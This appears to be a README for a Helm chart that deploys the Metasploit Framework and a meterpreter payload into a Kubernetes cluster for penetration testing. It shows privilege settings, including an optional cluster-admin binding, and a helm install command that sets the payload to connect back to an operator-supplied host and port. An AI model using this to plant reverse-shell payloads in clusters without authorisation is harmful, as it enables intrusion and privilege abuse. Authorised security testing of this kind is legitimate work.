
# Running Metasploit Framework Against Kubernetes

Running metasploit framework against Kubernetes enables pentesters to security test cluster components such as the API Server, as well as internal application components or micro-services.

The installation chart (meterpreter) also offers to install & run a metasploit payload, that connects back to metasploit console.
The payload can be deployed with different priviliges and permissions with respect to Kubernetes node hosting metasploit payload, as well as Kubernetes API server itself - see 'priviliges' section under values.yaml

```yaml
priviliges:
  # Disable Kubernetes API Server Access - even to the discovery APIs
  useServiceAccount: true
  # Run metasploit framework as Kubernetes cluster admin (useServiceAccount must be true for this setting to be effective)
  bindClusterRole: "" #cluster-admin 

  #
  # Priviliges related to node hosting metasploit Pod
  # See: https://kubernetes.io/docs/tasks/configure-pod-container/security-context/
  podSecurityContext: {}
    # fsGroup: 2000
  # Metasploit container security context
  securityContext: {}
    #allowPrivilegeEscalation: false
    # capabilities:
    #   add:
    #   - NET_BIND_SERVICE
    #   drop:
    #   - all
    #runAsNonRoot: true
    #runAsUser: 1000
    #runAsGroup: 1000
```

# Installation

1. Make sure helm (version 3 or above) is [installed](https://helm.sh/docs/intro/install/)
2. Make sure you have an available Kubernetes cluster to deploy metasploit. You can install a local Kubernetes cluster using [KIND](https://kind.sigs.k8s.io/docs/user/quick-start/#installation)
    > You can create local KIND cluster by running  `make create-kind-cluster`

3. Install meterpreter helm chart by running:

```sh
export MSF_PORT="<routeable port from inside cluster>"
export MSF_IPADDRESS="<routeable ip from inside cluster>"
helm upgrade --create-namespace -i -n metasploit meterpreter ./meterpreter --set lport=$MSF_PORT --set lhost=$MSF_IPADDRESS
```
